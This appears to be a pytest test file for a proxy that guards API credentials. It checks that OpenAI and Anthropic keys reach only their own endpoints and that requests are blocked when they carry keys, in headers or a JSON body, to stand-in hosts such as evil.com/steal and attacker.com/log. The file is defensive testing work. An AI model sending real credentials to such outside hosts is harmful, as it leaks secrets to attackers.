"""
Black box tests for credential guard.

These tests verify that:
1. API keys are only sent to their authorized destinations
2. Blocked requests do NOT leak credentials to the sinkhole
3. Legitimate requests pass through with credentials intact
"""

import pytest


class TestCredentialRouting:
    """Test that credentials only reach their authorized hosts."""

    def test_openai_key_to_openai_allowed(self, proxy_client, sinkhole, wait_for_services):
        """OpenAI API key to api.openai.com should be forwarded."""
        response = proxy_client.post(
            "https://api.openai.com/v1/chat/completions",
            headers={"Authorization": "Bearer sk-proj-test123456789abcdef"},
            json={"model": "gpt-4", "messages": []},
        )

        # Request should succeed (sinkhole returns 200)
        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        # Verify sinkhole received the request WITH credentials
        requests = sinkhole.get_requests(host="api.openai.com")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"

        # Check Authorization header is present (case-insensitive)
        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "authorization" in headers_lower, f"Authorization header missing. Headers: {list(requests[0].headers.keys())}"
        assert headers_lower["authorization"].startswith("Bearer sk-"), "Credential not forwarded correctly"

    def test_openai_key_to_evil_blocked(self, proxy_client, sinkhole, wait_for_services):
        """OpenAI API key to evil.com should be BLOCKED."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789abcdef"},
            json={"data": "secret"},
        )

        # Request should be blocked (428 requires approval)
        assert response.status_code == 428, f"Expected 428, got {response.status_code}: {response.text}"

        # CRITICAL: Sinkhole should NOT receive ANY request
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0, f"Credential leaked to evil.com! Got {len(requests)} requests"

    def test_anthropic_key_to_anthropic_allowed(self, proxy_client, sinkhole, wait_for_services):
        """Anthropic API key to api.anthropic.com should be forwarded."""
        response = proxy_client.post(
            "https://api.anthropic.com/v1/messages",
            headers={
                "x-api-key": "sk-ant-api03-test123456789abcdef",
                "anthropic-version": "2023-06-01",
            },
            json={"model": "claude-3-opus-20240229", "messages": [], "max_tokens": 100},
        )

        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        requests = sinkhole.get_requests(host="api.anthropic.com")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"

        # Check x-api-key header is present (case-insensitive)
        headers_lower = {k.lower(): v for k, v in requests[0].headers.items()}
        assert "x-api-key" in headers_lower, f"x-api-key header missing. Headers: {list(requests[0].headers.keys())}"

    def test_anthropic_key_to_attacker_blocked(self, proxy_client, sinkhole, wait_for_services):
        """Anthropic API key to attacker.com should be BLOCKED."""
        response = proxy_client.post(
            "https://attacker.com/log",
            headers={"x-api-key": "sk-ant-api03-test123456789abcdef"},
            json={"stolen": True},
        )

        assert response.status_code == 428, f"Expected 428, got {response.status_code}: {response.text}"

        # Verify no leak
        requests = sinkhole.get_requests(host="attacker.com")
        assert len(requests) == 0, f"Credential leaked to attacker.com! Got {len(requests)} requests"

    def test_no_credentials_passes_through(self, proxy_client, sinkhole, wait_for_services):
        """Request without credentials should pass through normally."""
        response = proxy_client.get("https://httpbin.org/get")

        assert response.status_code == 200, f"Expected 200, got {response.status_code}: {response.text}"

        requests = sinkhole.get_requests(host="httpbin.org")
        assert len(requests) == 1, f"Expected 1 request, got {len(requests)}"


class TestCredentialInBody:
    """Test that credentials in request bodies are also detected."""

    def test_key_in_json_body_blocked(self, proxy_client, sinkhole, wait_for_services):
        """API key embedded in JSON body should be blocked."""
        response = proxy_client.post(
            "https://evil.com/webhook",
            json={
                "config": {
                    "api_key": "sk-proj-test123456789abcdef",
                    "endpoint": "https://api.openai.com",
                }
            },
        )

        # Should be blocked (403 or 428)
        assert response.status_code in (403, 428), f"Expected 403 or 428, got {response.status_code}: {response.text}"

        # Verify no leak
        requests = sinkhole.get_requests(host="evil.com")
        assert len(requests) == 0, f"Credential in body leaked to evil.com! Got {len(requests)} requests"


class TestBlockResponseContent:
    """Test the content of block responses."""

    def test_block_response_includes_event_id(self, proxy_client, wait_for_services):
        """Blocked requests should include event_id for audit trail."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789abcdef"},
        )

        assert response.status_code == 428

        # Response should include event_id or request_id for correlation
        data = response.json()
        has_id = "event_id" in data or "request_id" in data
        assert has_id, f"No event ID in response: {data}"

    def test_block_response_indicates_approval_required(self, proxy_client, wait_for_services):
        """Block response should indicate approval is required."""
        response = proxy_client.post(
            "https://evil.com/steal",
            headers={"Authorization": "Bearer sk-proj-test123456789abcdef"},
        )

        assert response.status_code == 428
        data = response.json()

        # Should indicate this needs approval
        response_text = str(data).lower()
        assert "approval" in response_text or "prompt" in response_text, f"Response doesn't indicate approval needed: {data}"
